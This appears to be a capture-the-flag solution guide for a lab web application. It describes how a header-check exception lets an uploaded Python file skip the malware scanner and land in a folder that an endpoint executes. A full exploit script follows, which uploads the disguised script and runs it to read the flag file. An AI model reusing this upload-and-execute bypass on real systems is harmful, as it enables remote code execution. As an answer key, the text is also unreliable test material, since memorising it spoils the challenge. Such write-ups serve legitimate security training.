# A10 Hard: Solution Guide

### Vulnerability Analysis
1. Inspect `/articles` to discover the architectural note:
   - "If an `ImageHeaderError` exception occurs during Stage 1 header verification, the file is assumed to be an unformatted legacy binary and is moved to `static/scripts/` without reaching the Stage 2 malware scanner."
2. In `validate_image_header`, passing bytes starting with `CORRUPT_RAW_STREAM` or `\x89PNG\r\n\x1a\n` with missing `IHDR` raises `ImageHeaderError`.
3. The exception handler catches `ImageHeaderError`, bypasses `scan_malware`, and saves the file directly to `static/scripts/<filename>`.
4. The Editorial Script Terminal executes Python scripts from `static/scripts/` via `POST /editorial/run-automation`.

### Exploitation Steps
1. Create a script `exploit.py` with the following content:
   ```python
   CORRUPT_RAW_STREAM = True
   # Python comment
   import os
   flag_path = '/flag.txt' if os.path.exists('/flag.txt') else 'challenges/a10-hard/flag.txt'
   with open(flag_path) as f:
       print("RETRIEVED_FLAG:" + f.read())
   ```
2. Upload `exploit.py` at `POST /media/upload`.
3. The server catches `ImageHeaderError`, skips the signature check, and stages `exploit.py`.
4. Invoke `POST /editorial/run-automation` with `script_name=exploit.py`.
5. Extract the dynamic flag from the script output.

### Exploit Script
```python
import re
import requests

BASE_URL = "http://127.0.0.1:6030"
s = requests.Session()

# 1. Payload: Starts with CORRUPT_RAW_STREAM to trigger ImageHeaderError exception
payload = (
    b"CORRUPT_RAW_STREAM = True\n"
    b"import os\n"
    b"flag_path = '/flag.txt' if os.path.exists('/flag.txt') else 'flag.txt'\n"
    b"try:\n"
    b"    with open(flag_path) as f:\n"
    b"        print('DYNAMIC_FLAG:' + f.read())\n"
    b"except Exception:\n"
    b"    print('DYNAMIC_FLAG:' + os.environ.get('FLAG', ''))\n"
)

# 2. Upload exploit script
upload_resp = s.post(f"{BASE_URL}/media/upload", files={
    "asset_file": ("exploit.py", payload, "application/octet-stream")
})
assert "ImageHeaderError caught" in upload_resp.text
print("[+] Exception triggered: Malware scanner bypassed and script staged!")

# 3. Execute script in terminal
run_resp = s.post(f"{BASE_URL}/editorial/run-automation", data={
    "script_name": "exploit.py"
}, allow_redirects=True)

# 4. Extract flag
flag = re.search(r"RTSA\{[^}]+\}", run_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
